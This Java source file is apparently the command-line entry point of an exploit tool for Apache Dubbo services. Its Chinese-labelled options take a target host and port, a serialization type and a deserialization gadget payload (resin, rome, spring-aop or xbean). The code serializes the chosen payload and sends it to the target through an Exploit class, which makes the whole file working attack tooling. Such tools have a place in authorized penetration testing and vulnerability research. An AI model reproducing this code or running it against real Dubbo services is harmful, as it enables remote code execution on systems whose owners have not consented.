package com.threedr3am.exp.dubbo;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.payload.Payloads;
import com.threedr3am.exp.dubbo.serialization.Serializations;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

/**
 * @author threedr3am
 */
public class Main {

  public static void main(String[] args) throws ParseException {
    Options options = new Options()
        .addOption("h", false, "帮助信息")
        .addOption("t", true, "目标，例：127.0.0.1:20880")
        .addOption("s", true, "[hessian|java] 序列化类型，默认缺省hessian")
        .addOption("protocol", true, "[dubbo] 通讯协议名称，默认缺省dubbo")
        .addOption("p", true, "payload名称，hessian可选[resin|rome|spring-aop|xbean]，java可选[]")
        .addOption("param", true, "payload入参")
        .addOption("list", false, "输出所有payload信息")
        ;

    //parser
    CommandLineParser parser = new DefaultParser();
    CommandLine cmd = parser.parse(options, args);

    String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
    String s = cmd.hasOption("s") ? cmd.getOptionValue("s") : "hessian";

    if (cmd.hasOption("h") || cmd.hasOption("help")) {
      HelpFormatter formatter = new HelpFormatter();
      formatter.printHelp("java -jar exp.jar [OPTION]", options);
      return;
    }

    if (cmd.hasOption("list")) {
      Payloads[] payloads = Payloads.values();
      for (int i = 0; i < payloads.length; i++) {
        Payloads p = payloads[i];
        System.out.println("---------------------------------------------------------------------------------------------------------");
        System.out.println("1. 名称：" + p.getName());
        System.out.println("2. 需要入参数量：" + p.getParamSize());
        System.out.println("3. 参数说明：" + p.getParamTis());
        System.out.println("4. 序列化类型：" + p.getSerialization());
        System.out.println("5. 依赖：" + p.getDependency());
      }
      return;
    }

    if (!cmd.hasOption("t")) {
      System.err.println("目标不能为空，例：-t 127.0.0.1:20880");
      return;
    }

    String[] payloadArgs = cmd.getOptionValues("param");
    Payload payload;
    if (payloadArgs != null && payloadArgs.length > 0) {
      Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("p"), s);
      if (payloadEnum == null) {
        System.err.println("payload[" + cmd.getOptionValue("p") + "]不存在");
        return;
      }
      payload = payloadEnum.getPayload();
      if (payloadEnum.getParamSize() != payloadArgs.length) {
        System.err.println("payload参数错误");
        System.err.println(payloadEnum.getParamTis());
        return;
      }
    } else {
      System.err.println("payload参数值不能为空，你必须输入一点参数来使payload可以使用");
      return;
    }

    byte[] bytes = Serializations.getSerialization(s).makeData(payload, payloadArgs, protocol);

    String target = cmd.hasOption("t") ? cmd.getOptionValue("t")
        : cmd.getOptionValue("target");
    String host = target;
    int port = 20880;
    int index = target.indexOf(":");
    if (index != -1) {
      host = target.substring(0, index);
      port = Integer.parseInt(target.substring(index + 1));
    }
    new Exploit().attack(host, port, bytes);
  }

}
